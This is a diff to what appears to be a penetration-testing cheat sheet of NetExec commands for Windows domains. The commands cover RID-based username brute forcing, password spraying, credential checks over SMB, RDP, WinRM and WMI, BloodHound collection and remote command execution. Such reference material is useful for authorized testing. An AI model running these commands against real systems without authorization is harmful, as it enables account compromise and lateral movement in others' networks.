@@ -33,6 +33,9 @@ cat $IP.json | jq '. | map_values(keys)'
 # Brute force usernames through RIDs
 nxc smb $IP -u 'a' -p '' --rid-brute 10000
 
+# Check password policy
+nxc smb $IP -u 'a' -p '' --pass-pol
+
 # Brute force discovered users
 nxc smb $IP -u users.txt -p users.txt --continue-on-success
 
@@ -43,8 +46,14 @@ nxc smb $IP -u users.txt -p 'password' -d corp.com --continue-on-success
 ### Credentialed commands
 
 ```bash
-# Check credentials (default to smb)
-nxc smb $IP -u username -p 'password'
+# Check credentials
+nxc smb $IP -u $USER -p '$PASS'
+nxc rdp $IP -u $USER -p '$PASS'
+nxc winrm $IP -u $USER -p '$PASS'
+nxc wmi $IP -u $USER -p '$PASS'
+
+# Run BloodHound
+nxc ldap $IP -d $DOMAIN -u $USER -p $PASS --bloodhound -ns 10.10.99.140 --collection all
 
 # Execute commands (default to wmi, then smb)
 nxc wmi $IP -u username -p 'password' -x whoami
